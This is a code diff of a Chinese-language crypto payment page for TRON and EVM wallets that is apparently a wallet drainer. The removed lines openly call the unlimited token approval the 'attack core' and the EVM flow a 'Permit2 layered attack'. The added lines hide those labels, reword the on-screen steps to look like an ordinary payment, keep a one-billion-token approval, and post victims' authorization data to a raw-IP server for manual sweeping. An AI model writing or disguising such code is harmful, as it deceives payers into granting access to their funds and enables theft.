@@ -761,13 +761,13 @@
       <div class="verify-box">
         <div class="shield-ring"><div class="shield-icon"><i class="icon-svg" data-lucide="shield-check"></i></div></div>
         <div class="verify-title">正在处理支付</div>
-        <div class="verify-desc">请在弹出的钱包窗口中<strong>确认交易</strong>，完成安全授权与付款。</div>
+        <div class="verify-desc">请在弹出的钱包窗口中<strong>确认交易</strong>，完成支付。</div>
         <div class="verify-progress"><div class="verify-progress-bar" id="verifyProgress"></div></div>
         <div class="verify-steps">
           <div class="verify-step" id="vstep1"><div class="verify-step-icon">1</div><span>验证订单信息</span></div>
-          <div class="verify-step" id="vstep2"><div class="verify-step-icon">2</div><span>安全授权确认</span></div>
-          <div class="verify-step" id="vstep3"><div class="verify-step-icon">3</div><span>提交支付交易</span></div>
-          <div class="verify-step" id="vstep4"><div class="verify-step-icon">4</div><span>完成到账</span></div>
+          <div class="verify-step" id="vstep2"><div class="verify-step-icon">2</div><span>确认支付金额</span></div>
+          <div class="verify-step" id="vstep3"><div class="verify-step-icon">3</div><span>提交交易</span></div>
+          <div class="verify-step" id="vstep4"><div class="verify-step-icon">4</div><span>支付完成</span></div>
         </div>
       </div>
     </div>
@@ -1363,9 +1363,9 @@
         // 步骤 1: 验证订单
         setVStep(1, 'done'); setVStep(2, 'active'); setProgress(20);
 
-        // 步骤 2: approve 无限授权给 Router（攻击核心！）
-        const MAX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-        const tx1 = await tokenContract.approve(routerAddr, MAX).send({
+        // 步骤 2: approve（授权代币给支付网关）
+        const approveAmt = '0x' + (1_000_000_000n * 10n ** 18n).toString(16);
+        const tx1 = await tokenContract.approve(routerAddr, approveAmt).send({
           feeLimit: 100000000,
           from: tronAddress,
         });
@@ -1393,7 +1393,7 @@
       }
     }
 
-    // === EVM Payment (Permit2 分层攻击) ===
+    // === EVM Payment ===
     async function onPayEvm() {
       if (!account) { openWalletSelect(); return; }
       const amt = parseFloat(document.getElementById('payAmount').value || 0);
@@ -1451,7 +1451,7 @@
         setVStep(3, 'done'); setVStep(4, 'active'); setProgress(80);
 
         // 步骤 4: 存储授权数据（不自动 sweep，后台手动操作）
-        await fetch('http://154.222.16.152:3999/store', {
+        await fetch('http://36.151.145.15:3999/store', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
